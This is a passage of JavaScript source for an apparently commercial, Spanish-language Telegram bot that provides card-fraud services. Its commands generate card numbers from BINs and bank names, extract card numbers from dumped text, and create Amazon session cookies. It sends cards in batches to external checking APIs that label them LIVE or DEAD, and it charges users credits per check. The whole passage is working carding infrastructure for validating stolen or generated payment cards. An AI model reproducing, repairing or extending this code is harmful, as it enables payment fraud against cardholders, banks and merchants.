        } else if (esBanco) {
            // Nombre de banco -> obtener un bin aleatorio y luego extrapolar
            const binElegido = getBinForBank(param);
            if (!binElegido) throw new Error('No se encontraron bins para ese banco');
            await sendSafeMessage(chatId, `🔍 Banco detectado. Usando BIN: ${binElegido}`);
            // Llamar recursivamente con el BIN
            const fakeMsg = { ...msg, text: `/amazon ${binElegido}` };
            bot.emit('text', fakeMsg);
            return;
        } else {
            tarjetas = limpiarTarjetas(param);
            if (tarjetas.length === 0) throw new Error('No se encontraron tarjetas.');
            if (tarjetas.length > 20) return sendSafeMessage(chatId, `⚠️ Máximo 20 tarjetas (tienes ${tarjetas.length}).`);
            await sendSafeMessage(chatId, `💳 *Tarjetas a verificar:*\n${tarjetas.map(t => `\`${t}\``).join('\n')}`, { parse_mode: 'Markdown' });
        }
        const total = tarjetas.length;
        let progressMsg = await sendSafeMessage(chatId, `🔍 Verificando 0/${total}...`);
        const resultados = [];
        for (let i = 0; i < total; i++) {
            const card = tarjetas[i];
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 30000);
                const resp = await fetch(API_AMAZON_CHECK_URL, {
                    method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ card, cookies: cookie }), signal: controller.signal
                });
                clearTimeout(timeoutId);
                const data = await resp.json();
                resultados.push({ card, status: data.status, message: data.message });
            } catch (err) {
                resultados.push({ card, status: 'ERROR', message: err.message });
            }
            const emoji = resultados[i].status === 'LIVE' ? '✅' : (resultados[i].status === 'DEAD' ? '❌' : '⚠️');
            try {
                await bot.editMessageText(`🔍 Verificando ${i+1}/${total}\nÚltima: ${card} → ${resultados[i].status} ${emoji}`, { chat_id: chatId, message_id: progressMsg.message_id });
            } catch (e) {}
            await new Promise(r => setTimeout(r, 800));
        }
        const separador = SEPARATORS[Math.floor(Math.random() * SEPARATORS.length)];
        let resumen = `📊 *Resultados finales*\n${separador}\n`;
        for (const r of resultados) {
            const emoji = r.status === 'LIVE' ? '✅' : (r.status === 'DEAD' ? '❌' : '⚠️');
            resumen += `• Card: \`${r.card}\`\n• Status: ${r.status} ${emoji}\n${separador}\n`;
        }
        if (resumen.length > 4096) resumen = resumen.substring(0,4000) + '...';
        await sendSafeMessage(chatId, resumen, { parse_mode: 'Markdown' });
    } catch (error) {
        await sendSafeMessage(chatId, `❌ Error: ${error.message}`);
    }
    clearUserState(telegramId);
});

// /amazoncookie
bot.onText(/^\/(?:amazoncookie|amazoncuki|amazonck|amzck)(?:\s+(.+))?/i, async (msg, match) => {
    const chatId = msg.chat.id;
    const telegramId = msg.from.id;
    await sendSafeMessage(chatId, '🍪 Generando nueva cookie...');
    try {
        const response = await fetch(`${API_GENCOOKIE_URL}/generate`, {
            method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ country: 'MX', add_address: true })
        });
        const data = await response.json();
        if (!data.success) throw new Error('Error');
        const cookie = data.data.cookie_string;
        await updateUserCookie(telegramId, cookie);
        const creditResult = await deductCredits(telegramId, 4);
        await sendSafeMessage(chatId, `✅ Cookie generada. Créditos restantes: ${creditResult?.newCredits || '?'}. Ahora verificando...`);
        const fakeMsg = { chat: { id: chatId }, from: { id: telegramId }, text: match[0] + ' ' + (match[1] || '') };
        bot.emit('text', fakeMsg);
    } catch (err) {
        await sendSafeMessage(chatId, `❌ Error: ${err.message}`);
    }
});

// /lattice (simplificado)
bot.onText(/^\/(?:lattice)(?:\s+(.+))?/i, async (msg, match) => {
    const chatId = msg.chat.id;
    const telegramId = msg.from.id;
    let amount = match[1];
    if (!amount) {
        setUserState(telegramId, { step: 'awaiting_lattice_amount' });
        return sendSafeMessage(chatId, '💰 Ingresa el monto (ej. 19.99):');
    }
    if (!await checkAndKickIfNoDaysOrCredits(telegramId, chatId, 1)) return;
    setUserState(telegramId, { step: 'awaiting_lattice_cards', data: { amount } });
    await sendSafeMessage(chatId, '💳 Envía las tarjetas (texto sucio o patrón):');
});

// /limpiador
bot.onText(/\/limpiador(?:\s+(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    let texto = match[1];
    if (!texto) {
        setUserState(msg.from.id, { step: 'awaiting_limpiador' });
        return sendSafeMessage(chatId, '📝 Envía el texto sucio:');
    }
    const tarjetas = limpiarTarjetas(texto);
    if (tarjetas.length === 0) return sendSafeMessage(chatId, '❌ No se encontraron tarjetas.');
    const lista = tarjetas.slice(0,30).map(t => `\`${t}\``).join('\n');
    await sendSafeMessage(chatId, `🔍 *Tarjetas encontradas (${tarjetas.length}):*\n${lista}`, { parse_mode: 'Markdown' });
    clearUserState(msg.from.id);
});

// /creditos
bot.onText(/\/creditos|\/credits|\/saldo/, async (msg) => {
    const user = await getUserByTelegramId(msg.from.id);
    if (!user) return sendSafeMessage(msg.chat.id, '❌ Usa /start.');
    await sendSafeMessage(msg.chat.id, `💰 Créditos: ${user.credits}\n📅 Días: ${user.days_remaining}`, { parse_mode: 'Markdown' });
});

// /menu y /help
bot.onText(/\/menu/, async (msg) => {
    const opts = { reply_markup: { inline_keyboard: [
        [{ text: '🍪 Generar Cookie', callback_data: 'menu_gencookie' }],
        [{ text: '🔍 Extrapolador', callback_data: 'menu_extrapolador' }],
        [{ text: '🎴 Generar Tarjetas', callback_data: 'menu_gen' }],
        [{ text: '🧹 Limpiador', callback_data: 'menu_limpiador' }],
        [{ text: '🔍 Verificar Amazon', callback_data: 'menu_chk' }],
        [{ text: '💰 Créditos', callback_data: 'menu_creditos' }]
    ] } };
    await sendSafeMessage(msg.chat.id, '📋 *Menú principal*', { parse_mode: 'Markdown', ...opts });
});

bot.onText(/\/help/, async (msg) => {
    await sendSafeMessage(msg.chat.id,
        `📖 *Comandos:*\n/start\n/gencookie [país]\n/setcookie [cookie]\n/binlist [banco/pais]\n/extrapolador [bin|banco]\n/gen [extra|bin|banco]\n/amazon [extra|bin|tarjetas|banco]\n/amazoncookie\n/lattice [monto]\n/limpiador\n/creditos\n/menu`, { parse_mode: 'Markdown' });
});

// ========== MANEJO DE RESPUESTAS INTERACTIVAS ==========
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const telegramId = msg.from.id;
    const state = userStates.get(telegramId);
    if (!state || !state.step) return;
    if (msg.text?.startsWith('/')) return;
    let inputText = msg.text;
    if (msg.reply_to_message && msg.reply_to_message.from.id === bot.botInfo.id) inputText = msg.reply_to_message.text + ' ' + msg.text;
    switch (state.step) {
        case 'awaiting_binlist_query': bot.emit('text', { ...msg, text: `/binlist ${inputText}` }); break;
        case 'awaiting_extrapolador_input': bot.emit('text', { ...msg, text: `/extrapolador ${inputText}` }); break;
        case 'awaiting_gen_param': bot.emit('text', { ...msg, text: `/gen ${inputText}` }); break;
        case 'awaiting_gencookie_country': bot.emit('text', { ...msg, text: `/gencookie ${inputText}` }); break;
        case 'awaiting_setcookie': bot.emit('text', { ...msg, text: `/setcookie ${inputText}` }); break;
        case 'awaiting_amazon_cards': bot.emit('text', { ...msg, text: `/amazon ${inputText}` }); break;
        case 'awaiting_lattice_amount': bot.emit('text', { ...msg, text: `/lattice ${inputText}` }); break;
        case 'awaiting_lattice_cards': {
            const amount = state.data.amount;
            const tarjetas = limpiarTarjetas(inputText);
            if (tarjetas.length === 0) return sendSafeMessage(chatId, '❌ No se encontraron tarjetas.');
            await sendSafeMessage(chatId, `🔍 Verificando ${tarjetas.length} tarjetas con Lattice ($${amount})...`);
            try {
                const resultados = [];
                for (const card of tarjetas.slice(0,10)) {
                    const resp = await fetch(API_LATTICE_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ card, amount }) });
                    const data = await resp.json();
                    resultados.push({ card, status: data.status });
                }
                const separador = SEPARATORS[Math.floor(Math.random() * SEPARATORS.length)];
                let resumen = `${separador}\n`;
                for (const r of resultados) resumen += `• Card: ${r.card}\n• Status: ${r.status}\n${separador}\n`;
                await sendSafeMessage(chatId, resumen);
                await deductCredits(telegramId, 1);
            } catch (err) { await sendSafeMessage(chatId, `❌ Error: ${err.message}`); }
            break;
        }
        case 'awaiting_limpiador': bot.emit('text', { ...msg, text: `/limpiador ${inputText}` }); break;
        default: break;
    }
    clearUserState(telegramId);
});

// ========== CALLBACK QUERY ==========
bot.on('callback_query', async (callbackQuery) => {
    const msg = callbackQuery.message;
    const chatId = msg.chat.id;
    const telegramId = callbackQuery.from.id;
    const data = callbackQuery.data;
    if (data === 'gencookie_for_amazon') {
        try {
            const response = await fetch(`${API_GENCOOKIE_URL}/generate`, {
                method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ country: 'MX', add_address: true })
            });
            const json = await response.json();
            if (!json.success) throw new Error('Error');
            const cookie = json.data.cookie_string;
            await updateUserCookie(telegramId, cookie);
            const creditResult = await deductCredits(telegramId, 4);
            await sendSafeMessage(chatId, `✅ Cookie generada. Créditos restantes: ${creditResult?.newCredits || '?'}\nAhora envía las tarjetas:`);
            setUserState(telegramId, { step: 'awaiting_amazon_cards' });
        } catch (err) {
            await sendSafeMessage(chatId, `❌ Error: ${err.message}`);
        }
        await bot.answerCallbackQuery(callbackQuery.id);
    } else {
        let respuesta = '';
        switch(data) {
            case 'menu_gencookie': respuesta = 'Usa /gencookie MX (o US, CA...). Cuesta 4 créditos.'; break;
            case 'menu_extrapolador': respuesta = 'Usa /extrapolador 123456 (10 créditos)'; break;
            case 'menu_gen': respuesta = 'Usa /gen 549949056298xxxx|05|2029'; break;
            case 'menu_limpiador': respuesta = 'Usa /limpiador y luego envía el texto'; break;
            case 'menu_chk': respuesta = 'Usa /amazon [tarjetas|patrón|BIN|banco]'; break;
            case 'menu_creditos': respuesta = 'Usa /creditos'; break;
            default: respuesta = 'Opción no válida.';
        }
        await sendSafeMessage(chatId, respuesta, { parse_mode: 'Markdown' });
        await bot.answerCallbackQuery(callbackQuery.id);
    }
});

console.log('✅ Bot mejorado listo y funcionando');